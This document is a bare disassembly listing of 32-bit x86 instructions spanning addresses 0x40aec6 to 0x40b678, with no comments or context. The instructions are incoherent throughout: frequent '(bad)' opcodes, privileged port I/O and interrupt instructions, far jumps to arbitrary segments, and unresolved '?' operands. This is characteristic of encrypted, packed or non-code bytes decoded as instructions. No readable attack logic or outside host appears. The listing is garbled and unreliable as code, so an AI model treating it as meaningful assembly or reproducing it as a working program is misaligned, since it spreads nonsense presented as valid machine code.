  40aec6:	test   eax,0xecf7b6d6
  40aecb:	mov    eax,0x4d9c6f12
  40aed0:	sti    
  40aed1:	stos   DWORD PTR es:[edi],eax
  40aed2:	mov    al,0x53
  40aed4:	mov    DWORD PTR [ebx-0x2bafb5b],edx
  40aeda:	adc    BYTE PTR ds:0xf6561cd5,bl
  40aee0:	arpl   WORD PTR [esp+ebp*2+0x69fdeee7],dx
  40aee7:	xchg   BYTE PTR [esi-0x28],dl
  40aeea:	mov    al,BYTE PTR cs:[ecx+edi*8]
  40aeee:	inc    ebx
  40aeef:	pusha  
  40aef0:	lods   eax,DWORD PTR ds:[esi]
  40aef1:	je     0x40ae92
  40aef3:	popa   
  40aef4:	pop    es
  40aef5:	adc    eax,0xd5ae7a3a
  40aefa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aefb:	dec    ebx
  40aefc:	cmp    BYTE PTR [eax+0x3c],dl
  40aeff:	clc    
  40af00:	add    DWORD PTR [eax-0x7],eax
  40af03:	(bad)  
  40af05:	stc    
  40af06:	out    0xbe,eax
  40af08:	push   edx
  40af09:	pusha  
  40af0a:	xor    esi,DWORD PTR [eax+0x358cc0c2]
  40af10:	lods   al,BYTE PTR ds:[esi]
  40af11:	stc    
  40af12:	(bad)  
  40af13:	addr16 clc 
  40af15:	fist   WORD PTR [ecx]
  40af17:	mov    WORD PTR [edx-0x5dc685ea],ds
  40af1d:	fwait
  40af1e:	aas    
  40af1f:	xor    BYTE PTR [edx+0x6c541833],0xf1
  40af26:	mov    ebp,0x5adf70dd
  40af2b:	jg     0x40af98
  40af2d:	ficom  WORD PTR [eax+edx*2-0x7c1b8ed9]
  40af34:	jnp    0x40af90
  40af36:	lods   al,BYTE PTR ds:[esi]
  40af37:	cmp    edi,DWORD PTR [eax+0x72]
  40af3a:	mov    eax,0x9b2de9ad
  40af3f:	jo     0x40af06
  40af41:	ret    
  40af42:	mov    eax,ds:0x297b7c3c
  40af47:	dec    edi
  40af48:	aas    
  40af49:	mov    eax,0x8a62fdb6
  40af4e:	dec    edi
  40af4f:	adc    eax,DWORD PTR [esi]
  40af51:	arpl   WORD PTR [eax+edi*2],di
  40af54:	out    dx,eax
  40af55:	ds add eax,0xde9b7668
  40af5b:	sbb    eax,0x36b2dee6
  40af60:	or     cl,ah
  40af62:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40af63:	push   ebx
  40af64:	pop    ss
  40af65:	shl    DWORD PTR ds:0xcb48858f,0x41
  40af6c:	les    edx,FWORD PTR [ecx+ebp*1-0x1bfb19df]
  40af73:	mov    ebp,0x9af2458b
  40af78:	inc    edi
  40af79:	jg     0x40af94
  40af7b:	add    BYTE PTR [ebp-0x3593f9c2],bl
  40af81:	jmp    0x40affe
  40af83:	popf   
  40af84:	sbb    DWORD PTR [edx-0x13],ecx
  40af87:	sub    BYTE PTR [edi+edx*4-0x1c],bl
  40af8b:	xchg   DWORD PTR [ebp-0x19],esp
  40af8e:	out    dx,al
  40af8f:	(bad)  
  40af90:	js     0x40af16
  40af92:	daa    
  40af93:	or     BYTE PTR [esi+0x7620198e],0xd8
  40af9a:	mov    ebp,0x2625ecef
  40af9f:	ss sbb al,0x43
  40afa2:	repz push eax
  40afa4:	pop    di
  40afa6:	push   eax
  40afa7:	pusha  
  40afa8:	jle    0x40af73
  40afaa:	popa   
  40afab:	pushf  
  40afac:	repnz add BYTE PTR ss:[esi-0xc],bl
  40afb1:	lods   al,BYTE PTR ds:[esi]
  40afb2:	inc    ebx
  40afb3:	fmul   st,st(5)
  40afb5:	bound  ebx,QWORD PTR [edx-0x59]
  40afb8:	mov    esp,0xadd31e4f
  40afbd:	dec    edi
  40afbe:	dec    esi
  40afbf:	pop    edi
  40afc0:	ret    
  40afc1:	ds pop edi
  40afc3:	sub    al,0xac
  40afc5:	add    ecx,esp
  40afc7:	(bad)  
  40afc8:	dec    ebp
  40afc9:	sub    BYTE PTR [ebp+0x5c4ef1ca],al
  40afcf:	adc    esi,0xffffff97
  40afd2:	scas   eax,DWORD PTR es:[edi]
  40afd3:	nop
  40afd4:	or     esp,DWORD PTR [ecx-0xe]
  40afd7:	scas   eax,DWORD PTR es:[edi]
  40afd8:	push   0x7e6c902e
  40afdd:	fwait
  40afde:	xchg   ebp,eax
  40afdf:	dec    ecx
  40afe0:	mov    WORD PTR [eax],?
  40afe2:	out    dx,al
  40afe3:	aam    0xb0
  40afe5:	(bad)  
  40afe6:	aam    0x56
  40afe8:	lds    edi,FWORD PTR [ecx+ecx*1+0x573230c9]
  40afef:	fild   QWORD PTR [ebp+eax*2-0x2181f126]
  40aff6:	add    bh,BYTE PTR [edx+0x555ddfb2]
  40affc:	sbb    eax,0x4622ce
  40b001:	std    
  40b002:	adc    al,0x2c
  40b004:	lods   al,BYTE PTR ds:[esi]
  40b005:	mov    al,0x15
  40b007:	shl    cl,cl
  40b009:	mov    esp,0x1c4b0753
  40b00e:	aam    0x1a
  40b010:	xchg   ebp,eax
  40b011:	test   DWORD PTR [esp+edx*4-0x1c],ebp
  40b015:	add    BYTE PTR [esp+ecx*1-0x29],0x49
  40b01a:	fimul  WORD PTR [edx]
  40b01c:	push   edx
  40b01d:	mov    al,0x4b
  40b01f:	and    ch,bh
  40b021:	js     0x40afcb
  40b023:	test   al,0x33
  40b025:	pop    ss
  40b026:	dec    eax
  40b027:	cmp    esp,DWORD PTR [eax+0x76226f34]
  40b02d:	rcr    ah,cl
  40b02f:	pop    ss
  40b030:	imul   edi,DWORD PTR [edi-0x14],0x31c116fb
  40b037:	mov    ebx,0x623ba474
  40b03c:	not    BYTE PTR [edi+0x216fe799]
  40b042:	pusha  
  40b043:	mov    ecx,DWORD PTR [edi+0x57f8af8a]
  40b049:	stc    
  40b04a:	inc    esi
  40b04b:	xchg   esp,eax
  40b04c:	jmp    0xd3b4f56
  40b051:	ret    
  40b052:	push   esi
  40b053:	adc    DWORD PTR [edi-0x24],0xc5f2cba4
  40b05a:	fs mov ecx,0xed33c421
  40b060:	aaa    
  40b061:	push   edi
  40b062:	push   ebp
  40b063:	fimul  DWORD PTR [edx-0x6dd225ce]
  40b069:	cmc    
  40b06a:	in     eax,0x6
  40b06c:	add    BYTE PTR cs:[eax],ch
  40b06f:	push   eax
  40b070:	mov    BYTE PTR [ecx],dl
  40b072:	and    edi,DWORD PTR [eax-0x64]
  40b075:	sahf   
  40b076:	daa    
  40b077:	and    al,0xeb
  40b079:	xchg   ebp,eax
  40b07a:	xchg   edi,eax
  40b07b:	pusha  
  40b07c:	sti    
  40b07d:	out    0xbd,al
  40b07f:	xor    al,0x26
  40b081:	cmp    eax,0x26fa3b7d
  40b086:	fcomp  st(0)
  40b088:	mov    ch,0xc4
  40b08a:	(bad)  
  40b08c:	mov    ss,WORD PTR [esi+esi*4]
  40b08f:	dec    esp
  40b090:	rcl    BYTE PTR [esi],cl
  40b092:	xor    cl,BYTE PTR [edi+0x22d84119]
  40b098:	pushf  
  40b099:	push   ds
  40b09a:	jmp    0x40b107
  40b09c:	jp     0x40b0a4
  40b09e:	fimul  WORD PTR [eax]
  40b0a0:	mov    al,ds:0x6b55d471
  40b0a5:	ja     0x40b0d9
  40b0a7:	sar    BYTE PTR [eax+0x72],cl
  40b0aa:	sub    al,0xf9
  40b0ac:	add    BYTE PTR [ecx-0x23],bl
  40b0af:	ins    DWORD PTR es:[edi],dx
  40b0b0:	je     0x40b10c
  40b0b2:	jb     0x40b103
  40b0b4:	fmul   QWORD PTR ds:0x4cee86ab
  40b0ba:	jae    0x40b0f9
  40b0bc:	ds retf 
  40b0be:	sbb    bh,BYTE PTR [ecx]
  40b0c0:	mov    esp,DWORD PTR [edi]
  40b0c2:	push   eax
  40b0c3:	mul    DWORD PTR [ecx+0x6]
  40b0c6:	jg     0x40b096
  40b0c8:	dec    eax
  40b0c9:	adc    eax,0x63f53087
  40b0ce:	dec    edi
  40b0cf:	pushf  
  40b0d0:	ficom  WORD PTR [esi-0xfd1fa57]
  40b0d6:	jae    0x40b0ca
  40b0d8:	jle    0x40b0ee
  40b0da:	mov    esp,0xcbc7f5c8
  40b0df:	sub    DWORD PTR [ecx*8+0x1efe2288],eax
  40b0e6:	and    ebx,DWORD PTR [esi]
  40b0e8:	mov    ebp,0xd0886825
  40b0ed:	or     DWORD PTR [edi+0x2535fd58],eax
  40b0f3:	jl     0x40b154
  40b0f5:	and    BYTE PTR [ebx-0x8663de2],ah
  40b0fb:	dec    eax
  40b0fc:	mov    eax,DWORD PTR [edx-0x51]
  40b0ff:	loopne 0x40b115
  40b101:	mov    bh,0xd
  40b103:	xchg   ebp,eax
  40b104:	sub    BYTE PTR [ebx+0x2b37b3b8],ah
  40b10a:	or     eax,0x27dee222
  40b10f:	pop    eax
  40b110:	xchg   edx,eax
  40b111:	mov    cl,0x76
  40b113:	mov    dl,0x2d
  40b115:	iret   
  40b116:	jle    0x40b18a
  40b118:	mov    edi,?
  40b11a:	cmp    dl,BYTE PTR [ecx+0x35]
  40b11d:	pop    esi
  40b11e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b11f:	or     cl,BYTE PTR [edi+0x65c6b370]
  40b125:	xor    edi,esp
  40b127:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b128:	jo     0x40b0fa
  40b12a:	ret    0x2a58
  40b12d:	into   
  40b12e:	jae    0x40b0dd
  40b130:	aam    0xb9
  40b132:	sti    
  40b133:	jns    0x40b198
  40b135:	imul   esp,DWORD PTR [edx+eiz*8+0x16],0x3b
  40b13a:	push   0x2c07913f
  40b13f:	mov    cl,0x35
  40b141:	and    eax,0x71b4b530
  40b146:	sar    BYTE PTR [ecx-0x54],1
  40b149:	cmovnp esi,DWORD PTR [eax-0x28]
  40b14d:	pop    ebp
  40b14e:	shl    edi,1
  40b150:	ror    BYTE PTR [esi+ebx*1-0x17],1
  40b154:	or     BYTE PTR [ebx],dh
  40b156:	adc    ah,bh
  40b158:	or     al,0x55
  40b15a:	mov    ebx,0x8284ac79
  40b15f:	jmp    0x5f6e295b
  40b164:	int3   
  40b165:	pop    ss
  40b166:	imul   edx,DWORD PTR [eax-0x6713873f],0x8e40d29c
  40b170:	dec    eax
  40b171:	dec    ebx
  40b172:	xchg   esi,eax
  40b173:	and    DWORD PTR [edi+0x31],edx
  40b176:	pusha  
  40b177:	icebp  
  40b178:	pushf  
  40b179:	inc    ecx
  40b17a:	out    dx,eax
  40b17b:	mov    ds:0x9a24c045,al
  40b180:	jp     0x40b1bf
  40b182:	scas   eax,DWORD PTR es:[edi]
  40b183:	mov    eax,0x256e8f06
  40b188:	xor    eax,0x6279b9c9
  40b18d:	mov    al,ds:0xcc38ffde
  40b192:	push   es
  40b193:	inc    ecx
  40b194:	aaa    
  40b195:	inc    esp
  40b196:	jmp    0x40b17f
  40b198:	loopne 0x40b187
  40b19a:	retf   0x2c1f
  40b19d:	cmp    edx,DWORD PTR [ebp-0x449a82dd]
  40b1a3:	add    al,BYTE PTR [ebx-0x74]
  40b1a6:	mov    ch,BYTE PTR [ebp+0x63]
  40b1a9:	jo     0x40b187
  40b1ab:	inc    edx
  40b1ac:	xor    edx,DWORD PTR [esi-0xf20821f]
  40b1b2:	jb     0x40b150
  40b1b4:	and    cl,BYTE PTR [eax+esi*4]
  40b1b7:	mov    ecx,ebp
  40b1b9:	jae    0x40b20a
  40b1bb:	ss sub eax,0xd4157ae2
  40b1c1:	dec    esp
  40b1c2:	loop   0x40b21e
  40b1c4:	add    al,0x72
  40b1c6:	jge    0x40b1e7
  40b1c8:	adc    BYTE PTR [ebp+0x6c],ch
  40b1cb:	add    BYTE PTR [eax-0x601536b1],0xa7
  40b1d2:	and    ebp,0x57
  40b1d5:	mov    eax,ds:0x5cdd8df1
  40b1da:	or     eax,0xf75ba54b
  40b1df:	lock fst DWORD PTR [edi+0x6297fe18]
  40b1e6:	call   0x1e885cce
  40b1eb:	inc    ebp
  40b1ec:	adc    bh,BYTE PTR [edi+0x37b644f8]
  40b1f2:	inc    esp
  40b1f3:	imul   DWORD PTR ds:0x6c2a326
  40b1f9:	or     eax,0x2a692019
  40b1fe:	cmp    al,0xd2
  40b200:	adc    al,0xfb
  40b202:	loope  0x40b220
  40b204:	pop    ecx
  40b205:	mov    cs,WORD PTR [ebp-0x4d]
  40b208:	daa    
  40b209:	inc    edi
  40b20a:	mov    esp,esi
  40b20c:	sub    eax,0x2fda0ad0
  40b211:	pop    esp
  40b212:	sub    edi,eax
  40b214:	add    eax,0xb014d2de
  40b219:	int3   
  40b21a:	je     0x40b213
  40b21c:	jmp    0x40b1a7
  40b21e:	call   0xf4597756
  40b223:	or     al,0xab
  40b225:	mov    dh,0xda
  40b227:	je     0x40b21c
  40b229:	sub    edi,ebp
  40b22b:	mov    dh,0x35
  40b22d:	jns    0x40b272
  40b22f:	mov    ebp,0x42d103c3
  40b234:	mov    ebx,0x6e07d319
  40b239:	into   
  40b23a:	lahf   
  40b23b:	int3   
  40b23c:	scas   eax,DWORD PTR es:[edi]
  40b23d:	imul   ebp,esp,0x3a
  40b240:	jmp    0x5c314091
  40b245:	scas   eax,DWORD PTR es:[edi]
  40b246:	fcomip st,st(1)
  40b248:	aad    0xe9
  40b24a:	out    dx,al
  40b24b:	cli    
  40b24c:	lea    ecx,[ebx]
  40b24e:	mov    dl,0xb2
  40b250:	lahf   
  40b251:	sbb    DWORD PTR [edi],esi
  40b253:	nop
  40b254:	sub    BYTE PTR [edi+esi*2],dh
  40b257:	nop
  40b258:	push   edx
  40b259:	sbb    DWORD PTR [eax],0xd43df6d7
  40b25f:	xchg   DWORD PTR [ebp+0x1da026a3],esp
  40b265:	outs   dx,DWORD PTR ds:[esi]
  40b266:	inc    edx
  40b267:	mov    esi,0xfefbed0
  40b26c:	cmp    BYTE PTR [ebx+edi*2+0x1b94d936],bl
  40b273:	sub    DWORD PTR [edi+0x566734a0],edi
  40b279:	inc    edx
  40b27a:	es jge 0x40b2c5
  40b27d:	adc    al,BYTE PTR [ecx+0x1ba418fc]
  40b283:	push   ss
  40b284:	in     al,0x35
  40b286:	push   ss
  40b287:	in     eax,dx
  40b288:	jp     0x40b25a
  40b28a:	rcl    BYTE PTR [eax],0xa8
  40b28d:	jne    0x40b268
  40b28f:	sub    eax,0x655ebfa6
  40b294:	add    DWORD PTR [eax-0x24f9478b],eax
  40b29a:	(bad)  
  40b29b:	pop    ds
  40b29c:	std    
  40b29d:	mov    al,0x28
  40b29f:	nop
  40b2a0:	sbb    BYTE PTR [edi+edi*1-0x65],al
  40b2a4:	jecxz  0x40b293
  40b2a6:	add    ebp,esp
  40b2a8:	fld    TBYTE PTR [ecx]
  40b2aa:	in     al,dx
  40b2ab:	cmp    eax,0x7667bb65
  40b2b0:	js     0x40b302
  40b2b2:	int    0xd2
  40b2b4:	sbb    ebp,edi
  40b2b6:	cli    
  40b2b7:	loop   0x40b2c7
  40b2b9:	adc    BYTE PTR [ebx],dh
  40b2bb:	inc    eax
  40b2bc:	loopne 0x40b278
  40b2be:	cmp    eax,0xdb7af66a
  40b2c3:	push   edx
  40b2c4:	in     eax,0x74
  40b2c6:	jmp    0x40b346
  40b2c8:	xor    al,0x7
  40b2ca:	jge    0x40b2b1
  40b2cc:	(bad)  
  40b2cd:	xor    al,0x4f
  40b2cf:	mov    edi,0x3220b9ab
  40b2d4:	in     al,dx
  40b2d5:	mov    eax,0xd1e52f6a
  40b2da:	inc    edi
  40b2db:	mov    dl,0xbf
  40b2dd:	push   ds
  40b2de:	in     al,dx
  40b2df:	frstor [edx]
  40b2e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b2e2:	fwait
  40b2e3:	sahf   
  40b2e4:	dec    ebp
  40b2e5:	dec    edx
  40b2e6:	cmp    ch,BYTE PTR [edi-0x4b]
  40b2e9:	cmp    BYTE PTR [ebp-0x43],0x43
  40b2ed:	(bad)  
  40b2ee:	push   edx
  40b2ef:	or     eax,0x15135401
  40b2f4:	and    al,0xd9
  40b2f6:	test   DWORD PTR [esp+eiz*2],esp
  40b2f9:	test   al,0x4a
  40b2fb:	test   ah,dl
  40b2fd:	aam    0x53
  40b2ff:	lods   al,BYTE PTR ds:[esi]
  40b300:	in     al,0xa9
  40b302:	retf   
  40b303:	sbb    DWORD PTR ds:0xf61d68ae,esp
  40b309:	inc    ebp
  40b30a:	adc    cl,BYTE PTR [edi+0x3d]
  40b30d:	scas   eax,DWORD PTR es:[edi]
  40b30e:	push   edi
  40b30f:	mov    ?,esp
  40b311:	int    0x35
  40b313:	mov    edx,0xbb67f25d
  40b318:	das    
  40b319:	inc    esp
  40b31a:	aam    0x93
  40b31c:	xor    DWORD PTR [esi-0x217df366],ecx
  40b322:	mov    ebx,0xf411c494
  40b327:	xchg   BYTE PTR [ebp-0x2fe60d12],al
  40b32d:	mov    dh,0x8f
  40b32f:	pop    esi
  40b330:	leave  
  40b331:	lock lods al,BYTE PTR ds:[esi]
  40b333:	jne    0x40b326
  40b335:	call   0x3606:0x46c9e539
  40b33c:	push   0xffffffe2
  40b33e:	and    BYTE PTR [ebx+0x40],dl
  40b341:	test   eax,0x79d361c4
  40b346:	fs iret 
  40b348:	rcl    edi,1
  40b34a:	jmp    edx
  40b34c:	xchg   ebx,eax
  40b34d:	or     eax,0xe37b5a5d
  40b352:	jl     0x40b3ae
  40b354:	lods   al,BYTE PTR ds:[esi]
  40b355:	stc    
  40b356:	ss in  al,dx
  40b358:	push   es
  40b359:	retfw  0xd4dc
  40b35d:	out    0x58,al
  40b35f:	mov    ebp,0x40a0f555
  40b364:	cmp    bh,ch
  40b366:	scas   al,BYTE PTR es:[edi]
  40b367:	add    bh,BYTE PTR [ebx]
  40b369:	test   DWORD PTR ds:0x204ca069,edx
  40b36f:	jnp    0x40b37b
  40b371:	sub    ecx,DWORD PTR [edx+0x37760fd9]
  40b377:	(bad)  
  40b378:	xor    DWORD PTR gs:[ebp-0x58],ebp
  40b37c:	jl     0x40b311
  40b37e:	inc    ebp
  40b37f:	aam    0x2e
  40b381:	add    DWORD PTR [esi],0x76
  40b384:	adc    al,0x86
  40b386:	or     BYTE PTR [edi-0x5e],dh
  40b389:	inc    esi
  40b38b:	cdq    
  40b38c:	xor    DWORD PTR [eax-0x9],edx
  40b38f:	mov    dl,BYTE PTR [edx]
  40b391:	lahf   
  40b392:	es retf 
  40b394:	ror    BYTE PTR [ebx],1
  40b396:	sbb    edx,DWORD PTR [edx-0x36]
  40b399:	mov    ds:0x2e8d4254,al
  40b39e:	mov    esp,0x9068244
  40b3a3:	mov    al,0x22
  40b3a5:	(bad)  
  40b3a6:	cmc    
  40b3a7:	push   ecx
  40b3a8:	xchg   esi,eax
  40b3a9:	cld    
  40b3aa:	cmc    
  40b3ab:	not    BYTE PTR [eax-0x6a]
  40b3ae:	in     al,0xb7
  40b3b0:	dec    edi
  40b3b1:	mov    edx,0x958061ce
  40b3b6:	mov    ah,0x8c
  40b3b8:	jmp    0xb5f1:0xe89f247
  40b3bf:	nop
  40b3c0:	xor    ah,dl
  40b3c2:	popa   
  40b3c3:	not    ebp
  40b3c5:	dec    esp
  40b3c6:	mov    ds:0x2f8ca375,eax
  40b3cb:	xchg   edx,eax
  40b3cc:	int    0x33
  40b3ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b3cf:	or     edi,ebx
  40b3d1:	mov    al,0xdd
  40b3d3:	js     0x40b3dc
  40b3d5:	iret   
  40b3d6:	mov    WORD PTR [esi-0x7313260f],cs
  40b3dc:	cs mov esp,0x21b654a7
  40b3e2:	xor    ebp,DWORD PTR [esi]
  40b3e4:	mov    ds:0xe7ffc982,al
  40b3e9:	push   ecx
  40b3ea:	je     0x40b3ba
  40b3ec:	retf   
  40b3ed:	xor    BYTE PTR [edi],dh
  40b3ef:	xor    bh,BYTE PTR [eax]
  40b3f1:	adc    ch,BYTE PTR [ebp+0x3530c7d1]
  40b3f7:	xor    esi,DWORD PTR [ecx]
  40b3f9:	repnz stc 
  40b3fb:	and    esi,DWORD PTR [esi-0x41432beb]
  40b401:	in     al,0x74
  40b403:	mov    ?,edi
  40b405:	fwait
  40b406:	js     0x40b421
  40b408:	jo     0x40b3bb
  40b40a:	jbe    0x40b479
  40b40c:	inc    ecx
  40b40d:	sbb    al,ch
  40b40f:	lods   eax,DWORD PTR ds:[esi]
  40b410:	aaa    
  40b411:	xchg   edi,eax
  40b412:	xchg   edi,eax
  40b414:	gs adc al,0x2
  40b417:	loopne 0x40b3df
  40b419:	adc    al,0xf6
  40b41b:	stc    
  40b41c:	mov    edx,ds
  40b41e:	(bad)  
  40b420:	adc    al,0xaa
  40b422:	mov    eax,0xc81178f1
  40b427:	xchg   esp,eax
  40b428:	clc    
  40b429:	call   0x888a93be
  40b42e:	inc    ebp
  40b42f:	push   ds
  40b430:	adc    ecx,DWORD PTR [esi-0x45]
  40b433:	scas   eax,DWORD PTR es:[edi]
  40b434:	sahf   
  40b435:	jnp    0x40b436
  40b437:	pop    edx
  40b438:	xor    BYTE PTR [edx],ch
  40b43a:	jmp    0x7918:0xac0d43d
  40b441:	test   eax,0xf0442005
  40b446:	push   ebp
  40b447:	inc    esi
  40b448:	sub    ah,BYTE PTR [ebx]
  40b44a:	push   cs
  40b44b:	addr16 add eax,0x7b94d24
  40b451:	push   edx
  40b452:	mov    eax,ds:0x2b10d821
  40b457:	add    DWORD PTR [edi],ecx
  40b459:	pop    esi
  40b45a:	push   edx
  40b45b:	call   0x7855:0x9a1e15bd
  40b462:	cmp    DWORD PTR [esi-0x6a719540],edi
  40b468:	btr    DWORD PTR [ebx+0x66],ebx
  40b46c:	sbb    dl,BYTE PTR [ebx+edi*4]
  40b46f:	mov    BYTE PTR [edx+0x1da5004b],ch
  40b475:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b476:	inc    edx
  40b477:	add    ch,BYTE PTR [eax]
  40b479:	jecxz  0x40b45c
  40b47b:	nop
  40b47c:	dec    esp
  40b47d:	and    eax,0x516ed7fd
  40b482:	mov    eax,ds:0x474b02ae
  40b487:	outs   dx,DWORD PTR ds:[esi]
  40b488:	jmp    0x7047f60a
  40b48d:	xor    ch,BYTE PTR [edx+0x5cc3e0a5]
  40b493:	arpl   WORD PTR [ecx-0x67],dx
  40b496:	inc    esp
  40b497:	rcl    DWORD PTR [ecx],1
  40b499:	mov    cl,BYTE PTR [edi]
  40b49b:	jns    0x40b4a7
  40b49d:	or     ah,BYTE PTR [edx]
  40b49f:	rol    DWORD PTR [eax],0x22
  40b4a2:	icebp  
  40b4a3:	(bad)  
  40b4a5:	xor    BYTE PTR [ebx],ch
  40b4a7:	push   ss
  40b4a8:	mov    ebp,DWORD PTR [ebx-0x5fa692dd]
  40b4ae:	cmp    BYTE PTR [ecx+0x7a],0xd3
  40b4b2:	push   ebx
  40b4b3:	ds cmc 
  40b4b5:	mov    ecx,0x2f598553
  40b4ba:	mov    ebp,ecx
  40b4bc:	mov    ch,0xf7
  40b4be:	add    al,cl
  40b4c0:	aam    0xee
  40b4c2:	adc    dl,BYTE PTR [esi+0x63]
  40b4c5:	loopne 0x40b50a
  40b4c7:	in     eax,0xe0
  40b4c9:	out    dx,al
  40b4ca:	jp     0x40b4eb
  40b4cc:	push   eax
  40b4cd:	aam    0x90
  40b4cf:	sub    cl,BYTE PTR [ecx+0x6a808ceb]
  40b4d5:	outs   dx,BYTE PTR ds:[esi]
  40b4d6:	cli    
  40b4d7:	sbb    esi,edx
  40b4d9:	dec    esi
  40b4da:	and    DWORD PTR ds:0x345e239a,ecx
  40b4e0:	repz rol BYTE PTR [edi-0x7610d099],1
  40b4e7:	addr16 test al,0x3c
  40b4ea:	ds in  al,0x1c
  40b4ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b4ee:	jmp    0x40b527
  40b4f0:	(bad)  
  40b4f1:	rcr    edi,cl
  40b4f3:	sbb    bl,BYTE PTR [edi+eax*1-0x5985895b]
  40b4fa:	retf   0x4f37
  40b4fd:	data16 arpl WORD PTR [esi-0x6],bx
  40b501:	jle    0x40b4c3
  40b503:	test   DWORD PTR ds:0xae64cd98,0x26e68851
  40b50d:	sbb    dh,bh
  40b50f:	jecxz  0x40b508
  40b511:	mov    al,0x43
  40b513:	dec    edx
  40b514:	jecxz  0x40b540
  40b516:	loop   0x40b541
  40b518:	mov    ebx,0x3254c11a
  40b51d:	add    dh,bl
  40b51f:	mov    al,dh
  40b521:	adc    al,0x2c
  40b523:	shr    DWORD PTR [edi+0x742cbfc2],cl
  40b529:	add    eax,0xfce69211
  40b52e:	mov    ah,0x67
  40b530:	push   ecx
  40b531:	mov    eax,ds:0xe162873c
  40b536:	sbb    DWORD PTR [edx-0x1],ebx
  40b539:	sbb    al,0x5b
  40b53b:	push   esp
  40b53c:	inc    ecx
  40b53d:	ret    0xf71e
  40b540:	out    0xb5,al
  40b542:	imul   BYTE PTR [ebp+0x21]
  40b545:	pop    ebx
  40b546:	or     bh,BYTE PTR [ecx+0x52af3211]
  40b54c:	cli    
  40b54d:	pushf  
  40b54e:	(bad)  
  40b550:	xor    eax,0x495f022a
  40b555:	pushf  
  40b556:	sbb    esi,eax
  40b558:	sbb    esp,DWORD PTR [ebx+0xf]
  40b55b:	mov    dh,0x5
  40b55d:	iret   
  40b55e:	sti    
  40b55f:	and    eax,0x2c25b0c0
  40b564:	addr16 cmp al,0xf7
  40b567:	sahf   
  40b568:	xlat   BYTE PTR ds:[ebx]
  40b56a:	jg     0x40b541
  40b56c:	adc    eax,0xbff6a41a
  40b571:	(bad)  
  40b572:	jae    0x40b57d
  40b574:	fmul   QWORD PTR [ecx+0x29dcc1ee]
  40b57a:	jge    0x40b501
  40b57c:	mov    ch,0x7f
  40b57e:	sbb    eax,0x79f3afa
  40b583:	loope  0x40b589
  40b585:	inc    esp
  40b586:	push   es
  40b587:	inc    ebx
  40b588:	jbe    0x40b537
  40b58a:	ins    BYTE PTR es:[edi],dx
  40b58b:	jl     0x40b5e3
  40b58d:	aam    0xac
  40b58f:	aam    0xe8
  40b591:	add    DWORD PTR [ebp+0x1aeb7ee],edi
  40b597:	sti    
  40b598:	cmp    edx,DWORD PTR [ebp+0x796d8c8b]
  40b59e:	pop    ebx
  40b59f:	cdq    
  40b5a0:	mov    edi,0x9d3532cf
  40b5a5:	mov    ch,0x72
  40b5a7:	pop    ecx
  40b5a8:	add    BYTE PTR [edx-0x45],dh
  40b5ab:	xchg   ebp,eax
  40b5ac:	daa    
  40b5ad:	cmp    ebp,DWORD PTR [esi+0x47]
  40b5b0:	pop    eax
  40b5b1:	je     0x40b610
  40b5b3:	mov    ds:0xa6080a93,al
  40b5b8:	inc    esp
  40b5b9:	pop    ebx
  40b5ba:	xchg   esp,eax
  40b5bb:	push   eax
  40b5bc:	je     0x40b54d
  40b5be:	ja     0x40b5c5
  40b5c0:	outs   dx,BYTE PTR ds:[esi]
  40b5c1:	test   DWORD PTR [edi-0x4b3b54c5],eax
  40b5c7:	jbe    0x40b622
  40b5c9:	dec    eax
  40b5ca:	pop    edx
  40b5cb:	not    ecx
  40b5cd:	ss addr16 or eax,0xbf764ef
  40b5d4:	push   es
  40b5d5:	push   ebx
  40b5d6:	push   edx
  40b5d7:	nop
  40b5d8:	xor    ecx,ecx
  40b5da:	outs   dx,DWORD PTR ds:[esi]
  40b5db:	sub    dh,BYTE PTR [edx-0x12]
  40b5de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b5df:	jb     0x40b629
  40b5e1:	ret    0x832
  40b5e4:	icebp  
  40b5e5:	pop    esp
  40b5e6:	jg     0x40b56c
  40b5e8:	stc    
  40b5e9:	mov    esp,0x28dfe46d
  40b5ee:	rcl    bl,cl
  40b5f0:	int    0xf1
  40b5f2:	sar    BYTE PTR [bp+si+0xf7d],cl
  40b5f7:	addr16 push esi
  40b5f9:	out    0xc9,al
  40b5fb:	clc    
  40b5fc:	inc    edx
  40b5fd:	cwde   
  40b5fe:	dec    esi
  40b5ff:	je     0x40b5b9
  40b601:	push   ecx
  40b602:	push   eax
  40b603:	jp     0x40b5f1
  40b605:	test   DWORD PTR [ebx-0x2719ecc8],ecx
  40b60b:	pop    ds
  40b60c:	or     DWORD PTR [ebx],0xffffffef
  40b60f:	inc    ebx
  40b610:	pop    es
  40b611:	push   0x8f78ebe7
  40b616:	mov    edi,0xe991883
  40b61b:	(bad)  
  40b61c:	aaa    
  40b61d:	hlt    
  40b61e:	and    BYTE PTR [edi-0x720f515e],bl
  40b624:	push   edi
  40b625:	and    eax,0xdb144fc2
  40b62a:	and    eax,ebx
  40b62c:	mov    ds:0xaf708e2e,al
  40b631:	pusha  
  40b632:	or     DWORD PTR [ecx],eax
  40b634:	clc    
  40b635:	adc    eax,ebx
  40b637:	sub    eax,0x475dc106
  40b63c:	inc    edx
  40b63d:	enter  0x84a4,0x93
  40b641:	stc    
  40b642:	mov    ah,0x8d
  40b644:	add    al,0xaa
  40b646:	inc    edx
  40b647:	lahf   
  40b648:	js     0x40b633
  40b64a:	sbb    eax,0x8162c4f
  40b64f:	fbld   TBYTE PTR [edi]
  40b651:	pop    edx
  40b652:	loopne 0x40b5f4
  40b654:	pop    eax
  40b655:	mov    ah,0xef
  40b657:	xchg   BYTE PTR [esp+ebp*1-0x2cb689be],bh
  40b65e:	xchg   edx,eax
  40b65f:	jns    0x40b67d
  40b661:	cmp    BYTE PTR [edi],cl
  40b663:	jmp    0x3912:0x6fea5891
  40b66a:	jmp    0x40b628
  40b66c:	std    
  40b66d:	adc    BYTE PTR [ebx-0x13],cl
  40b670:	adc    DWORD PTR [eax+0x7ebf46d3],ebx
  40b676:	bound  esi,QWORD PTR [ebx]
  40b678:	inc    ecx
